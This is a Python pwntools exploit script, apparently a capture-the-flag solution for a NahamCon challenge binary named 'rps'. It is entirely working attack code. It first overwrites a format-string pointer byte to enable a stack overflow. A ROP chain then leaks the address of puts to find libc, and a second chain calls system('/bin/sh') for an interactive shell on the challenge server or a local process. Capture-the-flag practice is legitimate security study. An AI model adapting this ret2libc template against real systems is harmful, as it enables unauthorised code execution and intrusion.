#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./rps')
binary.symbols['rps'] = 0x401313

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 31004)
	libc = ELF('./libc-2.31.so')
else:
	p = process(binary.path)
	libc = binary.libc


p.sendlineafter('[y/n]: ','y')
p.sendlineafter('> ','1')

# move pointer from %d to %s
payload = b'yes\n\0' + (0x19 - 5 - 1) * b'A' + p8(0x8)
p.sendlineafter('[yes/no]: ',payload)

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x14 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.rps)

p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no')

_ = p.recv(6)
puts = u64(_ + b'\0\0')
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = b''
payload += 0x14 * b'A'
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(libc.search(b"/bin/sh").__next__())
payload += p64(libc.sym.system)

p.sendlineafter('> ',payload)
p.sendlineafter('[yes/no]: ','no')
p.interactive()
